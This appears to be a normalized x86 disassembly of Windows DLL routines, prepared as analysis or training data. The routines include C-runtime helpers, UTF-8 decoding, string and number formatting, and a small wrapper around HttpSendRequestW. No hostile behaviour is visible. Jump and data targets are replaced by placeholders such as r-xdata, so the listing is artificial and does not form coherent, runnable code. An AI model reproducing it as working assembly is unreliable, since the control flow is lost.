sub_1003fa7a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_100164fc
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1003fae8
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1003fb1e
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] ebx
setne cl
mov [ ebp - 0x14 ] ecx
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
call sub_10036f20
mov ecx [ ebp + 0x1c ]
sub ecx [ ebp - 0x10 ]
cmp eax ecx
jg r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_10026e29
mov ebx eax
add esp 0x10
test ebx ebx
js r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
push [ ebp - 0x10 ]
call sub_10026e29
add esp 0x10
test eax eax
js r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x1c
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_1007f5d0
add [ esi ] 0x2
add esp 0xc
add [ edi ] ebx
mov ebx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
and [ ebp - 0x14 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_1003fc20
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ edi ] eax
mov [ edx ] ecx
cmp [ edi ] ebx
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
cmp edx [ edi ]
pop edi
pop esi
sete al
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x1c ]
cmp [ edx ] eax
je r-xdata
mov esi [ edi ]
mov cl [ esi ]
cmp cl 0x80
jae r-xdata
cmp cl 0xc0
jb r-xdata
inc esi
movzx eax cl
mov [ edi ] esi
jmp r-xdata
inc [ edi ]
movzx eax cl
cmp cl 0xe0
jae r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
cmp cl 0xf0
jae r-xdata
and eax 0x1f
mov ecx 0x1
cmp eax 0x10ffff
ja r-xdata
mov [ ecx ] 0x1
cmp cl 0xf8
jae r-xdata
and eax 0xf
mov ecx 0x2
jmp r-xdata
inc esi
mov [ edi ] esi
test ecx ecx
jle r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x1c
mov ecx [ edx ]
mov ebx [ ebp + 0x10 ]
mov [ ecx ] ax
add [ edx ] 0x2
cmp [ edi ] ebx
jne r-xdata
and eax 0x3
cmp cl 0xfc
sbb ecx ecx
add ecx 0x5
jne r-xdata
and eax 0x7
mov ecx 0x3
jmp r-xdata
sub ebx esi
lea edx [ ecx + 0x1 ]
cmp ebx edx
jl r-xdata
mov edx [ ebp + 0x20 ]
jmp r-xdata
inc esi
mov [ edi ] esi
jmp r-xdata
mov dl [ esi ]
lea ebx [ edx + 0x80 ]
cmp bl 0x3f
ja r-xdata
movzx edx dl
and edx 0x3f
shl eax 0x6
dec ecx
inc esi
or eax edx
mov [ edi ] esi
test ecx ecx
jg r-xdata
sub_1003fd35
push 0x80
mov eax sub_100856f9
call sub_1003fae8
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x8c ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x68 ]
push eax
mov ecx ebx
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_10071f2c
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x78 ] eax
call sub_10034a80
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1000ff3d
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
and [ ebp - 0x1c ] 0x0
movzx eax ax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
lea eax [ edi + 0x8 ]
push eax
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_1004a330
movzx eax ax
mov [ ebp - 0x70 ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ ebp - 0x84 ] 0x1
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
and [ ebp - 0x54 ] eax
and [ ebp - 0x84 ] 0x0
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_1002f11b
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x58 ] al
mov [ ebp - 0x57 ] 0x65
call sub_1007f360
push [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
movsx eax [ ebp - 0x58 ]
push eax
push esi
call sub_1007f360
add esp 0x18
mov [ ebp - 0x60 ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x50 ]
add eax [ ebp - 0x54 ]
mov ecx [ ebx + 0x20 ]
add eax [ ebp - 0x74 ]
xor edx edx
add eax [ ebp - 0x5c ]
cmp [ ebx + 0x24 ] edx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] edx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x58 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_1007f360
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx edx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_1002e070
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
push [ ebp - 0x50 ]
push 0x65
push esi
call sub_1007f360
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x60 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x88 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1002b7bf
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x88 ]
push eax
push edi
call sub_1006ff82
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp + 0x14 ]
movzx eax ax
mov [ ebp - 0x68 ] ecx
push eax
lea ecx [ ebp - 0x6c ]
call sub_1003c746
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x68 ]
push [ ebp - 0x70 ]
mov eax [ ebp - 0x6c ]
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push edi
mov [ ebp + 0x14 ] ecx
call sub_1006ff82
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x60 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x64 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1006ff82
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
and [ ebp - 0x4c ] 0x0
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x84 ] edx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
push 0x30
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1002b7bf
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_1006ff82
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x8c ]
mov [ ebp + 0x14 ] eax
push edi
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_1006ff82
add esp 0x4c
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
mov eax [ ebp - 0x8c ]
call sub_1004642f
retn
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x68 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1002b7bf
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_1006ff82
mov ecx [ eax ]
and [ ebp - 0x54 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ ebx + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1001b67e
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x54 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10050540
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
and [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x4c ]
mov eax [ ebp - 0x60 ]
push 0x30
lea ecx [ ebp - 0x2c ]
test eax eax
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_1001b67e
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x68 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
mov ecx r--data
push [ ebp - 0x74 ]
sub eax esi
mov [ ebp - 0x60 ] eax
inc eax
push eax
call sub_10050540
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push [ ebp - 0x60 ]
call sub_10050540
and [ ebp - 0x74 ] 0x0
push [ ebp - 0x5c ]
call sub_1004ca10
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
and [ ebp - 0x5c ] 0x0
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
push eax
call sub_1007f580
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x84 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push 0x0
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_10050540
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_100401e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1001307f
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x8
call sub_1006299d
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax esi
sub_10040209
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10059d69
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
mov [ esi + 0x10 ] edx
call sub_1005be50
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_10035d06
pop ecx
pop esi
pop ebp
retn 0x4
sub_1004023e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push ebx
push [ ebp + 0x1c ]
xor ebx ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] eax
call sub_1001da0a
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x14 ] bl
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
mov [ eax ] bl
cmp esi ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
xor eax eax
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] edi
cmp edi ebx
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xd4 ]
pop edi
mov eax [ ebp - 0x10 ]
mov [ eax ] bl
cmp [ ebp - 0x8 ] ebx
jne r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
cmp al 0x25
je r-xdata
call sub_1006299d
mov [ eax ] 0x22
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
sub edi [ ebp - 0x4 ]
mov eax edi
cmp [ ebp - 0x14 ] bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
movsx eax al
push ecx
push eax
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc esi
xor eax eax
cmp [ esi ] 0x23
jne r-xdata
mov al [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp - 0x4 ]
jmp r-xdata
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push eax
mov al [ esi ]
lea edx [ ebp + 0x8 ]
call sub_10083dd5
add esp 0x10
test eax eax
je r-xdata
inc eax
inc esi
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
inc esi
mov [ ebp - 0x8 ] ecx
mov cl [ esi ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cl
inc [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_100403d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087259
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x1
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ esi + 0x10 ]
sub eax edx
add eax [ ebx + 0x10 ]
cmp edi eax
ja r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x1 ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
mov ecx esi
call sub_1002e070
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_1005e580
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10028950
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_100404a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_1002d84e
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0x7ffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_10013990
push ebx
push 0x0
mov ecx esi
call sub_10013990
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_10041880
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ esi ]
xor edx edx
mov [ ebx + eax ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10040599
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_100405c0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_1000831a
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
call sub_1003f800
test edi edi
je r-xdata
cmp edi 0x1
jne r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov cl [ ebp + 0xc ]
mov eax esi
mov [ eax ] cl
jmp r-xdata
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
movsx edx [ ebp + 0xc ]
push edi
push edx
push eax
call sub_1007f940
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1004067e
push 0xc
push r--data
call sub_1007fb20
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1001f6d0
push 0x1e
call sub_100134bc
push 0xff
call sub_10069aed
push 0x18
call sub_1002fb6b
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1006299d
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_1007fb65
retn
push edi
call sub_10035d06
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_10035d06
pop ecx
call sub_1006299d
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10040737
mov eax [ ebp - 0x1c ]
sub_10040740
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
push eax
push ecx
push edx
call [ lstrlenW@IAT ]
mov ecx [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ecx
call [ HttpSendRequestW@IAT ]
pop esi
test eax eax
jne r-xdata
mov eax 0x1
pop ebp
retn 0x8
push eax
call sub_1002cbe0
add esp 0x4
xor eax eax
pop ebp
retn 0x8
sub_10040783
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_1008399f
pop ebp
retn
sub_100407ad
push 0x4c
mov eax sub_10085a93
call sub_1003fae8
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x58 ] ebx
call sub_10048c94
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_100578b0
xor esi esi
add esp 0xc
movzx ebx ax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005c1f0
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] bx
jb r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_10063060
mov eax ebx
call sub_1004642f
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1004ca10
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
movzx eax [ eax ]
lea ecx [ ebx + 0x9 ]
cmp ecx eax
jge r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
mov al [ eax + esi * 2 ]
sub al bl
add al 0x30
movzx eax al
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1004ca10
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_10024441
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
mov ebx [ ebp - 0x58 ]
sub_10040901
mov edi edi
push ebp
mov ebp esp
fldz
